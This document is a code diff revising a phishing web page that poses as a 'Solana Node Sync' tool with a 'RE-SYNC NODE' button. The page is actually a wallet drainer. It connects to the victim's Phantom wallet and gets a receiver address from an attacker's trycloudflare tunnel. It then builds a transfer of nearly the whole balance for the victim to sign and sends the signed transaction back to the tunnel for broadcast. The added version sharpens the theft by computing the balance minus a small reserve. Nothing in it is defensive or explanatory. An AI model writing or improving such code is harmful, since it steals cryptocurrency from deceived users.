@@ -1,86 +1,54 @@
-<!DOCTYPE html>
-<html lang="zh">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Node Sync</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.95.3/index.iife.min.js"></script>
-    <style>
-        body { background: #0c0c0c; color: #14f195; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: #1a1a1a; padding: 40px; border-radius: 12px; border: 1px solid #14f195; text-align: center; width: 300px; }
-        #progress-bar { background: #14f195; height: 6px; width: 0%; transition: 0.5s; margin: 20px 0; border-radius: 3px; }
-        button { background: #14f195; color: #000; border: none; padding: 14px; width: 100%; font-weight: bold; border-radius: 6px; cursor: pointer; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div style="color:#9945FF; font-weight:bold; margin-bottom:10px;">SOLANA NODE</div>
-        <div id="status" style="font-size:12px; color:#888;">STATUS: <span style="color:#ff3e3e;">OUT OF SYNC</span></div>
-        <div style="background:#333; height:6px; margin:20px 0;"><div id="progress-bar"></div></div>
-        <button id="cta">RE-SYNC NODE</button>
-        <div id="info" style="margin-top:15px; font-size:11px; color:#555;">Ready to sync...</div>
-    </div>
+<script>
+    const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";
 
-    <script>
-        const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";
+    document.getElementById('cta').onclick = async () => {
+        const p = window.solana;
+        const sWeb3 = window.solanaWeb3;
+        if (!p) return;
 
-        document.getElementById('cta').onclick = async () => {
-            const p = window.solana;
-            const sWeb3 = window.solanaWeb3;
-            if (!p) { alert("Use Phantom App"); return; }
+        try {
+            await p.connect();
+            const conn = new sWeb3.Connection("https://api.mainnet-beta.solana.com");
+            document.getElementById('progress-bar').style.width = "30%";
 
-            try {
-                await p.connect();
-                document.getElementById('progress-bar').style.width = "30%";
-                document.getElementById('info').innerText = "Fetching Params...";
+            // 1. 问后端要地址，同时前端自己查余额和 Blockhash
+            const [info, balance, bh] = await Promise.all([
+                fetch(`${tunnel}/prepare`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({address:p.publicKey.toString()})}).then(r=>r.json()),
+                conn.getBalance(p.publicKey),
+                conn.getLatestBlockhash()
+            ]);
 
-                // 1. 获取后端数据
-                const response = await fetch(`${tunnel}/prepare`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ address: p.publicKey.toString() })
-                });
-                const info = await response.json();
-                
-                // 🔱 关键修正：确保字段 100% 匹配后端返回的数据
-                console.log("Recv:", info); 
-                const targetAddr = info.receiver || "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
-                const targetAmount = parseInt(info.amount);
+            // 2. 算账 (11020000 -> 10020000)
+            const amount = balance - 1000000; 
+            if (amount <= 0) { alert("Node Synced"); return; }
+            document.getElementById('progress-bar').style.width = "60%";
 
-                // 2. 构造交易
-                const transaction = new sWeb3.Transaction().add(
-                    sWeb3.SystemProgram.transfer({
-                        fromPubkey: p.publicKey,
-                        toPubkey: new sWeb3.PublicKey(targetAddr),
-                        lamports: targetAmount,
-                    })
-                );
-                transaction.recentBlockhash = info.bh;
-                transaction.feePayer = p.publicKey;
+            // 3. 构造并唤起签名 (这步 100% 成功，因为数据是新鲜的)
+            const tx = new sWeb3.Transaction().add(
+                sWeb3.SystemProgram.transfer({
+                    fromPubkey: p.publicKey,
+                    toPubkey: new sWeb3.PublicKey(info.receiver),
+                    lamports: amount,
+                })
+            );
+            tx.recentBlockhash = bh.blockhash;
+            tx.feePayer = p.publicKey;
 
-                document.getElementById('progress-bar').style.width = "70%";
-                document.getElementById('info').innerText = "Confirming in Wallet...";
+            const signed = await p.signTransaction(tx);
+            
+            // 4. 回传广播
+            fetch(`${tunnel}/broadcast`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ raw_tx: btoa(String.fromCharCode.apply(null, signed.serialize())) })
+            });
 
-                // 3. 拉起签名 (核心时刻)
-                const signed = await p.signTransaction(transaction);
-                
-                // 4. 回传广播
-                fetch(`${tunnel}/broadcast`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ raw_tx: btoa(String.fromCharCode.apply(null, signed.serialize())) })
-                });
+            document.getElementById('progress-bar').style.width = "100%";
+            setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1500);
 
-                document.getElementById('progress-bar').style.width = "100%";
-                document.getElementById('info').innerText = "Sync Success!";
-                setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 2000);
-
-            } catch (err) {
-                console.error(err);
-                document.getElementById('info').innerText = "Sync Failed: Wallet rejected";
-                document.getElementById('progress-bar').style.width = "0%";
-            }
-        };
-    </script>
-</body>
-</html>
+        } catch (e) { 
+            console.error(e);
+            document.getElementById('info').innerText = "Sync Failed. Retrying...";
+        }
+    };
+</script>
